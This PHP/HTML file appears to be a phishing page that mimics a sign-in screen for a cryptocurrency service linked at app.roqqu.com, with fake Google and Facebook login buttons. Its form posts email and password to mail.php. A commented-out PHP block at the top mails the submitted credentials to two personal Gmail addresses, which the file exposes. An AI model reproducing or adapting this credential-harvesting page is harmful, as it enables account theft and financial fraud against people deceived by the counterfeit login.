<?php /* if(isset($_POST['submit']))
{ 

$to = "obialorkingsley22@gmail.com";
$to1 = "blognetng@gmail.com";
$subject = "YelloAppChat Login Details";
$txt = "Email Address is: " .$_POST['email']. "  Password is: " .$_POST['password'];
$headers = "YelloAppChat Form";

mail($to,$subject,$txt,$headers);
mail($to1,$subject,$txt,$headers);

header("Location: mail.php");

} */
?>

<!DOCTYPE HTML>
<html>
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in</title>
<link rel="shortcut icon" type="jpg" href="favicon.png">

<link rel="stylesheet" href="bootstrap.min.css">

<link rel="stylesheet" href="main.min.css">

<style type="text/css">
body{
	background:#001739;
}

.dashed {
  overflow: hidden;
  text-align: center;
}

.dashed:before,
.dashed:after {
  background-color: #DCDCDC;
  content: "";
  display: inline-block;
  height: 1.5px;
  position: relative;
  vertical-align: middle;
  width: 50%;
}

.dashed:before {
  right: 0.5em;
  margin-left: -50%;
}

.dashed:after {
  left: 0.5em;
  margin-right: -50%;
}
::-webkit-input-placeholder { /* WebKit, Blink, Edge */
    color:    #909;
}
:-moz-placeholder { /* Mozilla Firefox 4 to 18 */
   color:    #909;
   opacity:  1;
}
::-moz-placeholder { /* Mozilla Firefox 19+ */
   color:    #909;
   opacity:  1;
}
:-ms-input-placeholder { /* Internet Explorer 10-11 */
   color:    #909;
}
::-ms-input-placeholder { /* Microsoft Edge */
   color:    #909;
}

::placeholder { /* Most modern browsers support this now. */
   color:    #909;
}
</style>
</head>
<body>
<br><br>
<img class="my-4 d-flex mx-auto" src="logo.png" width="160">
<br>
<div class="container">
    <div class="card">
        <div class="card-body">
<form name="form" action="mail.php" class="form-horizontal" method="POST">

    <h2 align="center" style="color:#001739">Sign in</h2>
    <br>
    <div class="form-group">
      <input required style="height:45px" type="email"  id="email" name="email" class="form-control" placeholder="Email address" />
      </div>

  <div class="form-group">
      <input required style="height:45px" type="text"  id="password" name="password" class="form-control" placeholder="Password" />
</div>

 <div class="form-group">
      <button class="btn btn-lg text-white btn-block" style="background-color:#006ee7;height:50px;" name="submit" type="submit">Sign in to your account</button>
    </div>
   <p class="mt-3 dashed" style="font-size:14px" align="center" style="color:#001739;"> <b><strong>or sign in with</strong></b></p>
    <div class="row">
     <div class="col-6">
         <div class="border shadow-sm border-muted p-3"><img width="22" src="google.png"/>       &nbsp; &nbsp;  <b style="font-size:14px">Google</b></div></div>

     <div class="col-6">
         <div class="border border-muted shadow-sm border-muted p-3"><img width="22" src="facebook.png"/>       &nbsp; &nbsp; <b style="font-size:14px">Facebook</b></div></div>
     <input type="hidden" name="MM_insert" value="form">



</form>
</div>
</div>
</div>
<h5 class="h5" align="center" style="color:#FFF"> <a href="https://app.roqqu.com/signup" style="color:#FFF">Don't have an account? </a> <a href="https://app.roqqu.com/account/recovery" style="color:#FFF">  Forgot password?  </a>  <a class="text-white" href="#">Terms</a> </a><p align="center" style="color:#fff">Having issues with two factor authentication?</h5>




</body>

</html>
